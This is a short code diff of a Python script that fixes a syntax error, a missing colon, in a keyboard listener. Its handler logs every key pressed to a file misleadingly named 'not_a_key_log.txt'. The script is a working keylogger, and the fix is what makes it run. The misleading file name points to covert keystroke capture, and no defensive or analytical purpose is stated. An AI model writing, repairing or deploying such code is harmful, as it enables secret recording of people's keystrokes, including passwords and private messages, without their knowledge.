@@ -12,5 +12,5 @@ logging.basicConfig(filename=(log + "not_a_key_log.txt"), level=logging.DEBUG, f
 def on_press(key):
     logging.info(str(key))
 
-with Listener(on_press=on_press) as listener
+with Listener(on_press=on_press) as listener:
     listener.join()
